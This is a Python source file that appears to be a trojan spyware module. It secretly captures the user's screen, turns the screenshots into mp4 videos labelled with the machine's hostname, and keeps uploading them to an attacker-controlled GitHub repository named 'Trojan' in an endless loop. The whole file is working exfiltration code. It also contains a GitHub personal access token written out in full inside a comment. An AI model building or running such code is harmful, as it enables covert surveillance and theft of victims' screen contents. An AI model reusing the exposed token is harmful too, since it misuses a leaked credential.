import cv2
import github3
#* pip install github3.py
import os
from PIL import Image
import pyautogui
import random
import socket 

from datetime import datetime
from time import sleep

#? Will work for other OSs besides Windows without additional 
#? packages being installed, but Windows will work stand alone

#* pip install pyautogui
#* https://pyautogui.readthedocs.io/en/latest/
#* PyAutoGUI only runs on Windows, macOS, and Linux.
#* right now PyAutoGUI only handles the primary monitor
#* On Linux, you must run sudo apt-get install scrot to use the screenshot features.

#* pip install opencv-python
#* https://pypi.org/project/opencv-python/
#* https://docs.opencv.org/4.x/

#? Used for screen capture
HOSTNAME = socket.gethostname()
IMAGE_DIR = './images/'
VIDEO_DIR = './videos/'
SLEEP_TIME = .25
FPS = 4
MOVIE_DURATION_IN_FRAMES = 20
IMG_EXT = 'jpg'
VIDEO_EXT = 'mp4'

#? Used for GitHub Upload
TOK = f'./github_token.tok'
REP = 'Trojan'
REP_KEY_PTH = 'videos'


def github_connect():

    try:
        with open(TOK) as file:
            token = file.read()
    except Exception as e:
        print(f'Error:{e}')

    user = 'agogeio'
    sess = github3.login(token=token)
    # sess = github3.login(token='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')
    #* To allow you to specify either a username and password combination or
    #* a token, none of the parameters are required. If you provide none of
    #* them, you will receive ``None``.
    # print(f'Session: {sess}')

    try:
        github = sess.repository(user, REP)
        #? Gets the requested repo
        # print(f'GitHub Repo: {github}')
        return github
    except Exception as e:
        print(f'GitHub connection error: {e}')
        return e


class ScreenCapture:
    def __init__(self) -> None:
        self.src_width, self.src_height = pyautogui.size()
        # src_width, src_height = pyautogui.size()
        self.width = int(self.src_width)
        self.height = int(self.src_height)
        self.videos = []
        
    def makeMovie(self, frames):

        now = datetime.now()
        current_time = now.strftime('%H:%M:%S')
        video_filename = f'{HOSTNAME}-{current_time}.{VIDEO_EXT}'
        video_path = f'{VIDEO_DIR}{video_filename}'

        #? Has to build a list of the videos to upload
        self.videos.append(video_path)

        fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
        video = cv2.VideoWriter(video_path, fourcc, FPS, (self.width, self.height))
        #? VideoWriter takes: output_name, fourcc, fps, size
        #* https://docs.opencv.org/3.4/dd/d9e/classcv_1_1VideoWriter.html

        for frame in frames:
            video.write(cv2.imread(frame))

        video.release()


    def getScreen(self):

        imgs = []
        frame = 0
        cont = True

        #? These must be cast to int, will return a float by default

        while cont == True:

            try:
                image_path = f'{IMAGE_DIR}{HOSTNAME}-{frame}.{IMG_EXT}'
                screenshot = pyautogui.screenshot()
                screenshot = screenshot.resize((self.width, self.height))
                screenshot.save(image_path)
                imgs.append(image_path)
                frame += 1
                sleep(SLEEP_TIME)
            except Exception as e:
                print(f'Exception: {e}')

            if frame > MOVIE_DURATION_IN_FRAMES:
                # call makeMovie to make the movie
                self.makeMovie(imgs)
                frame = 0
                cont = False
                # cleanFiles(imgs)
                # delete the old image frames


    def getVideoList(self):
    #? Needed a method to get all videos
        return self.videos

    
    def clearVideoList(self):
    #? Needed a method to clear videos
        
        for video in self.videos:
            print(f'Deleting: {video}')
            os.remove(video)

        self.videos = []



class GithubUpload:
    def __init__(self) -> None:
        self.data_path = f'{REP_KEY_PTH}/{id}/'
        self.repo = github_connect()   
        

    def store_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'{REP_KEY_PTH}/{message}.mp4'
        #! Changed this line to store an mp4 file
        bindata = bytes('%r' % data, 'utf-8')


        try:
            self.repo.create_file(remote_path, message, bindata)
            #? Human readable above
            # self.repo.create_file(remote_path, message, base64.b64encode(bindata))
            #? This is the remote_path in the GitHub repo not on the local machine
            #* https://docs.github.com/en/rest/repos/contents?apiVersion=2022-11-28#create-a-file
            #? base64 encoded
        except Exception as e:
            print(f'Error in store_module_result: {e}')


def run(**args):
    sc = ScreenCapture()
    sc.getScreen()

    gu = GithubUpload()

    while True:
        rand = random.randrange(5,15)
        # sleep(60*rand)
        sleep(30)

        videos = sc.getVideoList()

        for video_path in videos:
            # print(f'Video Path: {video_path}')
            with open(video_path, 'rb') as file:

                try:
                    conent = file.read()
                    gu.store_result(conent) 
                except Exception as e:
                    print(f'Exception: {e}')


if __name__ == '__main__':
    run()